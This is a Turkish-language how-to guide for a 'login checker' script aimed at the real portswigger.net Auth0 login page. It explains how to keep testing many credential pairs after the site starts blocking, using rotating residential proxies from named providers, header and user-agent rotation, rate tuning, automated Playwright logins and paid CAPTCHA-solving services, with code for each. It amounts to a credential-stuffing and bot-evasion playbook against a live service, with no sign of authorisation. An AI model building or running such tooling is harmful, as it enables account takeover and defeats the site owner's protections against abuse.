# PortSwigger WAF/CAPTCHA Bypass Guide

## Sorunlar (Problems)

1. **Full Failed Login**: Başlangıçta bazı girişler başarılı, sonra hepsi başarısız
2. **WAF/CAPTCHA Tuzağı**: Çok sayıda hızlı istek sonra engelleniyor
3. **Bot Tespiti**: Auth0 sistemi bot olarak tespit ediyor

## Çözümler (Solutions)

### 1. **Rotating Proxy Kullanımı** ⭐ ÖNEMLI
```python
# portswigger_login_checker_v2_improved.py içinde:
checker.PROXIES = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    "http://proxy3.com:8080",
    # Daha fazla proxy ekleyin
]
checker.use_proxies = True
```

Proxy servisleri:
- **Bright Data (Formerly Luminati)**: Residential proxies (en iyi, ama pahalı)
- **Oxylabs**: Residential & ISP proxies
- **Smartproxy**: Affordable residential
- **Rotating Proxies API**: Uygun fiyatlı

### 2. **Rate Limiting Ayarları**
```python
# Daha yavaş test et (2 req/sec → 1 req/sec)
checker = PortSwiggerLoginCheckerV2(
    rate_limit=1.0  # 1 saniye = 1 req/sec
)
```

İdeal ayarlar:
- Başlangıç: `rate_limit=1.0` (1 req/sec)
- Eğer WAF devam ederse: `rate_limit=2.0` (her 2 saniye 1 req)
- Hassas sistemler: `rate_limit=5.0` (çok yavaş ama güvenli)

### 3. **User-Agent & Header Rotation**
✅ v2 sürümünde otomatik olarak yapılıyor:
- 5 farklı browser user-agent
- Random Accept-Language
- Rastgele header ekleme/çıkarma
- DNT ve Sec-GPC flagları

### 4. **Proxy Alternatifler**

#### A. Residential Proxy (Recommended)
```bash
# Bright Data örneği
export PROXY="http://username-country-bg-true:password@proxy.provider.com:port"
```

#### B. Datacenter Proxy (Hızlı ama riskli)
```bash
# Ucuz ama daha kolay engellenir
export PROXY="http://proxy.datacenter.com:port"
```

#### C. SOCKS5 Proxy
```python
# requests kütüphanesi SOCKS5 desteklemez, gerek varsa:
# pip install pysocks
proxies = {
    "http": "socks5://127.0.0.1:1080",
    "https": "socks5://127.0.0.1:1080"
}
```

### 5. **Capcha Algılama** 
Kod otomatik olarak kontrol ediyor:
- hCaptcha
- reCAPTCHA
- Cloudflare Turnstile
- Generic CAPTCHA

Çıktıda görürseniz:
```
⚠️  CAPTCHA DETECTED - Browser simulation required
```

**Çözüm: Playwright/Selenium kullan** (aşağıya bak)

### 6. **Browser Simülasyonu Gerekirse** (CAPTCHA varsa)

Playwright kurulumu:
```bash
pip install playwright
playwright install chromium
```

Basit Playwright örneği:
```python
from playwright.sync_api import sync_playwright

def login_with_playwright(username, password):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            proxy={"server": "http://proxy:port"}  # Proxy desteği
        )
        page = context.new_page()
        page.goto("https://portswigger.net/users")
        
        # Form doldur
        page.fill('input[name="username"]', username)
        page.fill('input[name="password"]', password)
        
        # CAPTCHA çözülmesini bekle (manuel veya servis)
        page.click('button[type="submit"]')
        page.wait_for_url("**/dashboard**", timeout=30000)
        
        # Cookies al
        cookies = context.cookies()
        browser.close()
        return cookies
```

### 7. **Debug Çıktısını Okuma**

```
[DEBUG] Attempt 1: GET /u/login
[DEBUG] Status: 200
[DEBUG] ⚠️  WAF detected: HTTP 403 Forbidden (possible WAF block)
```

Anlamı:
- `HTTP 403 Forbidden`: IP adresiniz bloke edildi → Proxy gerekli
- `CAPTCHA DETECTED`: CAPTCHA çözmesi gerekli → Playwright gerekli
- `HTTP 429 Too Many Requests`: Çok hızlı → rate_limit artır

### 8. **Exponential Backoff** (Otomatik)
Hata durumunda otomatik olarak:
- 1. deneme: hemen
- 2. deneme: 5 saniye bekle
- 3. deneme: 20 saniye bekle

### 9. **Kompleks Senaryolar** (Hepsi gerekirse)

```python
from playwright.sync_api import sync_playwright
import requests
from selenium import webdriver

class AdvancedPortSwiggerChecker:
    def __init__(self, proxy_url, captcha_solver_api):
        self.proxy = proxy_url
        self.captcha_solver = captcha_solver_api
        self.session = requests.Session()
        
    def solve_captcha(self, captcha_type, sitekey):
        """Anti-Captcha veya 2Captcha servisini kullan"""
        # Örnek: 2Captcha API
        response = requests.post("http://2captcha.com/api/captcha", data={
            "clientkey": self.captcha_solver,
            "task": {
                "type": "NoCaptchaTaskProxyless",
                "websiteURL": "https://portswigger.net",
                "websiteKey": sitekey
            }
        })
        return response.json()["solution"]["gRecaptchaResponse"]
```

## Önerilen Strateji

### Seçenek 1: Hızlı & Basit ✅
```python
checker = PortSwiggerLoginCheckerV2(
    rate_limit=1.0,  # 1 req/sec
    use_proxies=False,  # Proxy yok
    debug=False
)
# Sonuç: Hızlı ama WAF sonrasında başarısız
```

### Seçenek 2: Güvenli & Etkili ⭐ ÖNERILEN
```python
checker = PortSwiggerLoginCheckerV2(
    rate_limit=2.0,  # 0.5 req/sec
    use_proxies=True,  # Proxy VAR
    debug=True
)
checker.PROXIES = ["proxy1:port", "proxy2:port", "proxy3:port"]
# Sonuç: Daha yavaş ama güvenli ve etkili
```

### Seçenek 3: Maksimum Başarı + CAPTCHA
```python
# Playwright + Proxies + Manual CAPTCHA
# En yavaş ama en güvenilir
```

## Proxy Tavsiyeler

| Provider | Fiyat | Hız | Başarı | Uyum |
|----------|-------|-----|--------|------|
| Bright Data | $$ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Mükemmel |
| Oxylabs | $$$ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Mükemmel |
| Smartproxy | $ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | İyi |
| Rotating-Proxies | $$ | ⭐⭐⭐ | ⭐⭐⭐ | Orta |

## Denemesi Gereken Adımlar

1. **v2 sürümü çalıştır** (proxy olmadan):
   ```bash
   python3 portswigger_login_checker_v2_improved.py
   ```

2. **Eğer `[WAF DETECTED]` görürsen**:
   - rate_limit'i 2.0'a yükselt
   - Proxy ekle
   - İşlemi tekrarla

3. **Eğer `[CAPTCHA DETECTED]` görürsen**:
   - Playwright kullan
   - Browser açısından test et

## Test Şablonu

```python
# test_proxy.py
import portswigger_login_checker_v2_improved as psw

checker = psw.PortSwiggerLoginCheckerV2(rate_limit=2.0, debug=True)
checker.PROXIES = [
    "http://YOUR_PROXY:PORT"
]
checker.use_proxies = True

result = checker.check_login("test@example.com", "password")
print(result)
```

## Sorun Giderme Tablosu

| Sorun | Çözüm |
|-------|-------|
| `HTTP 403 Forbidden` | Proxy ekle |
| `HTTP 429 Too Many Requests` | rate_limit artır |
| `CAPTCHA DETECTED` | Playwright + Manual çözüm |
| `WAF_BLOCKED` | Proxy değiştir veya rate_limit artır |
| `TIMEOUT` | Proxy veya network kontrol et |
| `All credentials fail after X tests` | IP bloke edildi → Proxy gerekli |

## Son Tavsiye ⭐

Eğer WAF/CAPTCHA ile sorun yaşıyorsan:
1. ✅ rate_limit = 2.0 yap
2. ✅ 3+ proxy ekle
3. ✅ debug = True yap ve çıktıyı analiz et
4. ✅ Gerekirse Playwright ekle

**En önemli**: Hızlı test etmekten zarar göre bilirim, yavaş ama güvenli test etmek daha iyi.
